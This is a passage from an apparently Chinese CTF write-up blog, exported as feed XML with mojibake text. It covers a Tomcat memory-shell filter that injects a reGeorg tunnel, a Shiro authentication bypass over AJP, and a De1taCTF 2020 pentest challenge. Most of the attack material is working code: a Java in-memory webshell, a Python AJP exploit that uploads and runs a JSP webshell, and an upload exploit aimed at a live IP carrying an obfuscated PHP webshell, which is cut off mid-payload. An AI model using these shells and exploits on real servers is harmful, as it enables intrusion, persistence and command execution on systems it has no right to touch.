class="string">"X-STATUS"</span>, <span class="string">"OK"</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    response.setHeader(<span class="string">"X-ERROR"</span>, e.getMessage());</span><br><span class="line">                    response.setHeader(<span class="string">"X-STATUS"</span>, <span class="string">"FAIL"</span>);</span><br><span class="line">                    socketChannel.socket().close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            filterChain.doFilter(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">        Object[] context=(Object[]) obj;</span><br><span class="line">        <span class="keyword">this</span>.session = (javax.servlet.http.HttpSession ) context[<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">this</span>.response = (org.apache.catalina.connector.Response) context[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">this</span>.request = (javax.servlet.http.HttpServletRequest) context[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            dynamicAddFilter(<span class="keyword">new</span> MemReGeorg(),<span class="string">"reGeorg"</span>,<span class="string">"/*"</span>,request);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">dynamicAddFilter</span><span class="params">(javax.servlet.Filter filter,String name,String url,javax.servlet.http.HttpServletRequest request)</span> <span class="keyword">throws</span> IllegalAccessException </span>&#123;</span><br><span class="line">        javax.servlet.ServletContext servletContext=request.getServletContext();</span><br><span class="line">        <span class="keyword">if</span> (servletContext.getFilterRegistration(name) == <span class="keyword">null</span>) &#123;</span><br><span class="line">            java.lang.reflect.Field contextField = <span class="keyword">null</span>;</span><br><span class="line">            org.apache.catalina.core.ApplicationContext applicationContext =<span class="keyword">null</span>;</span><br><span class="line">            org.apache.catalina.core.StandardContext standardContext=<span class="keyword">null</span>;</span><br><span class="line">            java.lang.reflect.Field stateField=<span class="keyword">null</span>;</span><br><span class="line">            javax.servlet.FilterRegistration.Dynamic filterRegistration =<span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                contextField=servletContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">                contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext);</span><br><span class="line">                contextField=applicationContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">                contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                standardContext= (org.apache.catalina.core.StandardContext) contextField.get(applicationContext);</span><br><span class="line">                stateField=org.apache.catalina.util.LifecycleBase.class.getDeclaredField("state");</span><br><span class="line">                stateField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);</span><br><span class="line">                filterRegistration = servletContext.addFilter(name, filter);</span><br><span class="line">                filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), <span class="keyword">false</span>,<span class="keyword">new</span> String[]&#123;url&#125;);</span><br><span class="line">                java.lang.reflect.Method filterStartMethod = org.apache.catalina.core.StandardContext.class.getMethod("filterStart");</span><br><span class="line">                filterStartMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                filterStartMethod.invoke(standardContext, <span class="keyword">null</span>);</span><br><span class="line">                stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED);</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                ;</span><br><span class="line">            &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">                stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="ajpè¶Šæƒçš„shiro-acl"><a href="#ajpè¶Šæƒçš„shiro-acl" class="headerlink" title="ajpè¶Šæƒçš„shiro acl"></a>ajpè¶Šæƒçš„shiro acl</h3><p>è¿™ä¸€ç‚¹åé¢çš„æç¤ºä¹Ÿç»™å‡ºæ¥äº†ï¼Œå¯ä»¥ç”¨<a href="https://gv7.me/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately">how-to-detect-tomcat-ajp-lfi-more-accurately</a>æåˆ°çš„åŠæ³•ï¼Œä¹Ÿå¯ä»¥ç”¨æˆ‘ä¹‹å‰æäº¤çš„<a href="https://gv7.me/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately">SHIRO-760</a>ã€‚pocåœ¨issueé‡Œé¢å·²ç»ç»™äº†ï¼Œæ¼æ´çš„demoç¯å¢ƒåœ¨<a href="https://github.com/cL0und/srpingboot-shiro">æˆ‘github</a>ä¸Šå¯ä»¥æ‰¾åˆ°ï¼Œè¿™é‡Œå€Ÿè¿™ä¸ªæœºä¼šåˆ†äº«ä¸€ä¸‹å½“æ—¶æŒ–æ˜çš„æ€è·¯ã€‚</p>
<p>é€šè¿‡åˆ†æ<a href="https://www.freebuf.com/vuls/231909.html">å‰äººçš„æ–‡ç« </a>å¯ä»¥çŸ¥é“ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“åœ¨org.apache.shiro.web.util.WebUtils#getPathWithinApplicationå†…éƒ¨ä¼šå¯¹requestUriè¿›è¡Œæå–å¹¶äº¤ç»™patchMatchesåŒ¹é…ä»¥åˆ¤æ–­æ˜¯å¦éœ€è¦é‰´æƒã€‚<br><img src="1594001505206-b96ba60b-1607-4ff5-91d4-8d7ad1c551f7.png#align=left&display=inline&height=293&margin=%5Bobject%20Object%5D&name=image.png&originHeight=586&originWidth=1492&size=199627&status=done&style=none&width=746" alt="image.png"><br>å¤šæ¬¡æ­¥å…¥åï¼Œå¯ä»¥çœ‹åˆ°å…·ä½“çš„è·å–uriçš„å®ç°æ˜¯å…¶ä¸­çš„getRequestUriã€‚getRequestUrié¦–å…ˆä¼šè·å–javax.servlet.include.request_uriçš„å€¼å¦‚æœè·å–åˆ°äº†å°±ä¸ä¼šè¿›å…¥ <code>if (uri == null)</code> ã€‚<br><img src="1594001525231-a1227a7d-bdc1-477f-8f4c-4f84030bff82.png#align=left&display=inline&height=242&margin=%5Bobject%20Object%5D&name=image.png&originHeight=484&originWidth=1492&size=183925&status=done&style=none&width=746" alt="image.png"><br>è€Œå¦‚æœæœ‰å¸ˆå‚…çœ‹è¿‡shiroä¸Šä¸€æ¬¡å¯¹è¶Šæƒçš„ä¿®å¤çš„è¯ä¼šå‘ç°ï¼Œè¡¥ä¸æ˜¯æ‰“åœ¨<code>if (uri == null)</code>ä¸­çš„ï¼Œé€šè¿‡ajpæ§åˆ¶<code>javax.servlet.include.request_uri</code>ç›¸å½“äºç»•è¿‡ä¸Šä¸€æ¬¡çš„è¡¥ä¸ç‚¹ã€‚<br><img src="1594001543733-534c473f-b23f-47f6-8449-dfc4a8a14f69.png#align=left&display=inline&height=239&margin=%5Bobject%20Object%5D&name=image.png&originHeight=478&originWidth=1492&size=139177&status=done&style=none&width=746" alt="image.png"><br>æ¥ç€è¿™é‡Œæå–å‡ºæ¥çš„uri<code>/;/admin/page</code>ä¼šè¿›å…¥decodeAndCleanUriStringä¸­è¿›è¡Œæ¸…æ´—ã€‚decodeAndCleanUriStringä¼šå–åˆ†å·å‰çš„å†…å®¹è¿”å›ã€‚<br><img src="1594001562448-3aaf5fc7-2aaa-4c45-a01e-990b3ab64cf1.png#align=left&display=inline&height=72&margin=%5Bobject%20Object%5D&name=image.png&originHeight=143&originWidth=1492&size=76386&status=done&style=none&width=746" alt="image.png"><br>åœ¨è¿™é‡Œè¿”å›çš„å°±æ˜¯<code>/</code>ï¼Œåé¢shiroçš„æ­£åˆ™<code>/admin/*</code>è‡ªç„¶ä¹Ÿå°±æ‹¦æˆªä¸äº†ã€‚</p>
<p>æ­¤å¤–ï¼Œå…‰ç»•è¿‡shiroè¿˜ä¸è¡Œï¼Œspringä¸è§£æè¿™æ¡è·¯ç”±ä¹Ÿæ²¡ç”¨ï¼Œä¸€ä¸ªå¼€å§‹æˆ‘ä¹Ÿä¸ºç”¨å‰äººæ–‡ç« ä¸­çš„ <code>/xxxx;/../</code> å¯ä»¥è½»æ¾ç»•è¿‡ï¼Œé»‘ç›’å‘ç°å¹¶ä¸è¡Œã€‚åˆ†æajpæ¼æ´çš„æ—¶å€™æˆ‘ä»¬çŸ¥é“ï¼Œtomcatå…ˆè°ƒç”¨å¯¹æ‰€æœ‰filterè¿›è¡Œè¿‡æ»¤ç„¶åä¼šè°ƒç”¨å¯¹åº”çš„servletï¼Œè€Œåœ¨springéƒ½æ˜¯ç»Ÿä¸€ç”±DispatcherServletè¿›è¡Œç»Ÿä¸€è°ƒåº¦çš„ã€‚æ‰€ä»¥ä¸€å¼€å§‹æˆ‘é€‰æ‹©æŠŠæ–­ç‚¹æ‰“åˆ°org.springframework.web.servlet.FrameworkServlet#doGetï¼ˆ_DispatcherServletç»§æ‰¿FrameworkServlet_ï¼‰ã€‚åˆå› ä¸ºspringæ˜¯é€šè¿‡HandlerMappingæ¥æ‰¾å¯¹åº”çš„æ§åˆ¶å™¨ï¼Œæ‰€ä»¥æ­¥å…¥æ–­ç‚¹ä¹‹åå°±å¼€å§‹æ‰¾å“ªä¸ªåœ°æ–¹æœ‰è¿™ä¸ªé€»è¾‘ã€‚æœ€ååœ¨/org/springframework/web/servlet/DispatcherServlet.class:484æ‰¾åˆ°ã€‚<br><img src="1594001660546-d8b7972b-9bb0-41cd-9b2c-37aa410d37d6.png#align=left&display=inline&height=391&margin=%5Bobject%20Object%5D&name=image.png&originHeight=782&originWidth=1492&size=329488&status=done&style=none&width=746" alt="image.png"><br>æ­¥å…¥ä¹‹åspringæŠŠå·²ç»æ³¨å†Œè¿‡Mappingè½®è¯¢ä¸€æ¬¡ã€‚åœ¨ä»£ç ä¸­æˆ‘ä»¬ç”¨çš„@GetMappingè¿™é‡Œå°±å¯¹åº”ReuqestMappingHandlerMappingã€‚<br><img src="1594001700248-56346a95-e72b-4a02-a020-7b80d006a673.png#align=left&display=inline&height=411&margin=%5Bobject%20Object%5D&name=image.png&originHeight=822&originWidth=1492&size=243393&status=done&style=none&width=746" alt="image.png"><br>æ­¥å…¥ReuqestMappingHandlerMappingä¹‹åå†å¤šæ¬¡æ­¥å…¥ï¼Œæœ€åæ¥åˆ°org.springframework.web.util.UrlPathHelper#getPathWithinApplication<br><img src="1594001720564-fc1f7a9c-b4ef-40ac-9601-f02cd5a74ee4.png#align=left&display=inline&height=163&margin=%5Bobject%20Object%5D&name=image.png&originHeight=325&originWidth=1492&size=183407&status=done&style=none&width=746" alt="image.png"><br>è¿™é‡Œä¸‰ä¸ªç®­å¤´æ˜¯å…³é”®çš„ä¸‰ä¸ªç‚¹ï¼Œç¬¬ä¸€ä¸ªç®­å¤´ä¼šå¯¹uriæå–å¹¶â€œæ¶ˆæ€â€ï¼Œç¬¬äºŒä¸ªç®­å¤´ä¼šå»pathWithinAppä¸­servletPathä¹‹åçš„å†…å®¹ã€‚ç¬¬ä¸‰ä¸ªç®­å¤´è¿”å›pathäº¤ç»™HandlerMappingåŒ¹é…ã€‚</p>
<p>æˆ‘ä»¬å…ˆæ¥çœ‹ç¬¬ä¸€ä¸ªç®­å¤´â€œæ¶ˆæ€â€çš„æ­¥éª¤ã€‚<br><img src="1594001748419-fe37e159-a3ac-4b7b-b5e2-2459cd4d7e54.png#align=left&display=inline&height=126&margin=%5Bobject%20Object%5D&name=image.png&originHeight=252&originWidth=1492&size=73032&status=done&style=none&width=746" alt="image.png"><br><img src="1594001754187-5c2a028f-f2c4-4846-9993-167ef84f4c21.png#align=left&display=inline&height=93&margin=%5Bobject%20Object%5D&name=image.png&originHeight=186&originWidth=1492&size=71193&status=done&style=none&width=746" alt="image.png"><br>ä¸Šå›¾removeSemicolonContentä¼šç§»é™¤uriä¸­<code>;</code>ï¼Œ<code>/;/admin/page</code>å˜ä¸º<code>//admin/page</code>ã€‚getSanitizedPathä¼šå¯¹ç§»é™¤é‡å¤çš„<code>/</code>ï¼Œ <code>//admin/page</code> å˜ä¸º <code>/admin/page</code> ï¼ˆ_psï¼šè¿™é‡Œå¹¶ä¸ä¼šå¤„ç†..åŠ.è¿™ä¹Ÿæ˜¯ä¸ºå•¥è€payload /xxx;/../æ— æ³•ç”¨çš„åŸå› ï¼Œè™½ç„¶å¯ä»¥ç»•è¿‡ä½†æ˜¯ä¹‹åspring handlerMappingåŒ¹é…ä¸åˆ°ã€‚_ï¼‰</p>
<p>å†æ¥ç¬¬äºŒä¸ªç®­å¤´ï¼Œè¿™ä¸ªgetRemainingPathä¼šæå–å¤„Uriä¸­conextPathä¹‹åçš„éƒ¨åˆ†ã€‚ä¸¾ä¸ªåä¾‹å¦‚æœæˆ‘ä»¬æŠŠ<code>javax.servlet.include.servlet_path</code>è®¾ç½®ä¸º<code>/</code>ï¼Œé‚£ä¹ˆè¿”å›ç»™HandlerMappingå°†ä¼šæ˜¯ <code>admin/page</code> ï¼Œè€ŒHandlerMappingåªä¼šåŒ¹é…<code>/admin/page</code>è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆ<code>javax.servlet.include.servlet_path</code>éœ€è¦ç½®ä¸ºç©ºçš„åŸå› ã€‚</p>
<p>å›è¿‡å¤´çœ‹æ¼æ´æœ¬è´¨è¿˜æ˜¯åœ¨äºspringå’Œshiroåœ¨è§„èŒƒæ¶ˆæ€urlæ—¶æ ‡å‡†ä¸ä¸€è‡´é€ æˆçš„é—®é¢˜ã€‚å› ä¸ºæœ€æ–°ç‰ˆçš„tomcatå·²ç»é»˜è®¤æŠŠajpå…³äº†ï¼Œå¹¶ä¸”åœ¨åä»£æƒ…å†µä¸‹tomcat 8009ä¹Ÿä¸ä¼šå¯¹å¤–å¼€æ”¾æ‰€ä»¥è¿™ä¸ªæ´çš„åˆ©ç”¨è¿˜æ˜¯å—å¾ˆå¤§é™åˆ¶çš„ã€‚</p>
<h3 id="ajpä¸Šä¼ æ–‡ä»¶"><a href="#ajpä¸Šä¼ æ–‡ä»¶" class="headerlink" title="ajpä¸Šä¼ æ–‡ä»¶"></a>ajpä¸Šä¼ æ–‡ä»¶</h3><p>å› ä¸ºç½‘ä¸Šajpåè®®è®¨è®ºè¾ƒå°‘ï¼Œå’Œexpæœ‰å…³çš„åªæœ‰CVE-2020-1938ï¼Œä¸è¿‡payloadçš„æ„é€ æ¯”è¾ƒå•ä¸€å¹¶ä¸æ¶‰åŠåˆ°ä¸Šä¼ æ–‡ä»¶çš„è¯·æ±‚ï¼Œç½‘ä¸Šåº”è¯¥ä¹Ÿæ²¡æœ‰ä»‹ç»ç›¸å…³çš„æ–‡ç« ã€‚é‚£è¦æ€ä¹ˆé€šè¿‡ajpä¼ ï¼Ÿæˆ‘é¢„æƒ³çš„æ€è·¯æ˜¯é€‰æ‰‹é€šè¿‡é˜…è¯»ç›¸å…³ç±»åº“æ¥è§£å†³æ¯”å¦‚<a href="https://github.com/hypn0s/AJPy">AJPy</a>ï¼Œåœ¨tomcat.pyä¸­æä¾›äº†ä¸€ç§éƒ¨ç½²waråŒ…getshellçš„æ“ä½œï¼Œè¿™é‡Œé¢å°±æœ‰ä¸Šä¼ æ–‡ä»¶çš„æ“ä½œï¼Œå¯ä»¥å€Ÿé‰´ã€‚<br><img src="1594002267067-acd0c056-d4bf-46f6-8187-192f0244dc41.png#align=left&display=inline&height=618&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1236&originWidth=2380&size=320042&status=done&style=none&width=1190" alt="image.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">from</span> ajpy.ajp <span class="keyword">import</span> AjpResponse, AjpForwardRequest, AjpBodyRequest, NotFoundException</span><br><span class="line"><span class="keyword">from</span> tomcat <span class="keyword">import</span> Tomcat</span><br><span class="line"></span><br><span class="line">target_host = <span class="string">"127.0.0.1"</span></span><br><span class="line">gc = Tomcat(target_host, <span class="number">8009</span>)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">"shell.jpg"</span></span><br><span class="line">payload = <span class="string">"&lt;% out.println(new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(\"cat /flag.txt\").getInputStream())).readLine()); %&gt;"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"/tmp/request"</span>, <span class="string">"w+b"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    s_form_header = <span class="string">'------WebKitFormBoundaryb2qpuwMoVtQJENti\r\nContent-Disposition: form-data; name="file"; filename="%s"\r\nContent-Type: application/octet-stream\r\n\r\n'</span> % filename</span><br><span class="line">    s_form_footer = <span class="string">'\r\n------WebKitFormBoundaryb2qpuwMoVtQJENti--\r\n'</span></span><br><span class="line">    f.write(s_form_header.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    f.write(payload.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    f.write(s_form_footer.encode(<span class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line">data_len = os.path.getsize(<span class="string">"/tmp/request"</span>)</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">        <span class="string">"SC_REQ_CONTENT_TYPE"</span>: <span class="string">"multipart/form-data; boundary=----WebKitFormBoundaryb2qpuwMoVtQJENti"</span>,</span><br><span class="line">        <span class="string">"SC_REQ_CONTENT_LENGTH"</span>: <span class="string">"%d"</span> % data_len,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">attributes = [</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">"name"</span>: <span class="string">"req_attribute"</span></span><br><span class="line">        , <span class="string">"value"</span>: (<span class="string">"javax.servlet.include.request_uri"</span>, <span class="string">"/;/admin/upload"</span>, )</span><br><span class="line">    &#125;</span><br><span class="line">    , &#123;</span><br><span class="line">        <span class="string">"name"</span>: <span class="string">"req_attribute"</span></span><br><span class="line">        , <span class="string">"value"</span>: (<span class="string">"javax.servlet.include.path_info"</span>, <span class="string">"/"</span>, )</span><br><span class="line">    &#125;</span><br><span class="line">    , &#123;</span><br><span class="line">        <span class="string">"name"</span>: <span class="string">"req_attribute"</span></span><br><span class="line">        , <span class="string">"value"</span>: (<span class="string">"javax.servlet.include.servlet_path"</span>, <span class="string">""</span>, )</span><br><span class="line">    &#125;</span><br><span class="line">, ]</span><br><span class="line"></span><br><span class="line">hdrs, data = gc.perform_request(<span class="string">"/"</span>, headers=headers, method=<span class="string">"POST"</span>,  attributes=attributes)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"/tmp/request"</span>, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    br = AjpBodyRequest(f, data_len, AjpBodyRequest.SERVER_TO_CONTAINER)</span><br><span class="line">    responses = br.send_and_receive(gc.socket, gc.stream)</span><br><span class="line"></span><br><span class="line">r = AjpResponse()</span><br><span class="line">r.parse(gc.stream)</span><br><span class="line"></span><br><span class="line">shell_path = r.data.decode(<span class="string">'utf-8'</span>).strip(<span class="string">'\x00'</span>).split(<span class="string">'/'</span>)[<span class="number">-1</span>]</span><br><span class="line">print(<span class="string">"="</span>*<span class="number">50</span>)</span><br><span class="line">print(shell_path)</span><br><span class="line">print(<span class="string">"="</span>*<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line">gc = Tomcat(<span class="string">'127.0.0.1'</span>, <span class="number">8009</span>)</span><br><span class="line"></span><br><span class="line">attributes = [</span><br><span class="line">    &#123;<span class="string">"name"</span>: <span class="string">"req_attribute"</span>, <span class="string">"value"</span>: (<span class="string">"javax.servlet.include.request_uri"</span>, <span class="string">"/"</span>,)&#125;,</span><br><span class="line">    &#123;<span class="string">"name"</span>: <span class="string">"req_attribute"</span>, <span class="string">"value"</span>: (<span class="string">"javax.servlet.include.path_info"</span>, shell_path,)&#125;,</span><br><span class="line">    &#123;<span class="string">"name"</span>: <span class="string">"req_attribute"</span>, <span class="string">"value"</span>: (<span class="string">"javax.servlet.include.servlet_path"</span>, <span class="string">"/"</span>,)&#125;,</span><br><span class="line">]</span><br><span class="line">hdrs, data = gc.perform_request(<span class="string">"/uploads/1.jsp"</span>, attributes=attributes)</span><br><span class="line">output = sys.stdout</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        output.write(d.data.decode(<span class="string">'utf8'</span>))</span><br><span class="line">    <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">        output.write(repr(d.data))</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>De1tactf2020 pentestéé¢„æœŸè§£ä¸é¢„æœŸè§£</title>
    <url>/2020/05/05/De1tactf2020-pentest%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3%E4%B8%8E%E9%A2%84%E6%9C%9F%E8%A7%A3/</url>
    <content><![CDATA[<!-- æŠŠä¸€äº›åœç•™åœ¨ç†è®ºè®¤çŸ¥ä¸Šçš„é«˜çº§æ”»å‡»å§¿åŠ¿å…¨éƒ¨æ“ç»ƒäº†ä¸€éï¼Œå­¦åˆ°å¾ˆå¤šã€‚ -->
<!-- more -->
<h2 id="pentest1"><a href="#pentest1" class="headerlink" title="pentest1"></a>pentest1</h2><p>å…ˆæ˜¯ä¸€ä¸ªæœ‰ç»•è¿‡çš„æ–‡ä»¶ä¸Šä¼ ï¼Œè¿™éƒ¨åˆ†æ˜¯å…¶ä»–å°ä¼™ä¼´åšçš„ç›´æ¥ç»™expäº†ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://47.113.219.76/index.php'</span></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">'Content-Type'</span>: <span class="string">'multipart/form-data; boundary=----WebKitFormBoundaryhJUhA4FiLizuakBx'</span></span><br><span class="line">&#125;</span><br><span class="line">data=<span class="string">"""------WebKitFormBoundaryhJUhA4FiLizuakBx</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="file"; filename="&#123;&#125;"</span></span><br><span class="line"><span class="string">Content-Type: image/jpeg</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&#125;</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryhJUhA4FiLizuakBx</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="submit"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">submit</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryhJUhA4FiLizuakBx--"""</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"""</span></span><br><span class="line"><span class="string">&lt;?=$_=[]?&gt;&lt;?=$_=@"$_"?&gt;&lt;?=$_=$_['!'=='@']?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$_?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$__=$_?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$___=$_?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$____=$_?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$_____=$_?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$______=$_?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$_______=$_?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$________=$_?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?=++$_____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$_____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$_____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$_____?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?=++$______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$______?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?=++$_______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$_______?&gt;</span></span><br><span class="line"><span 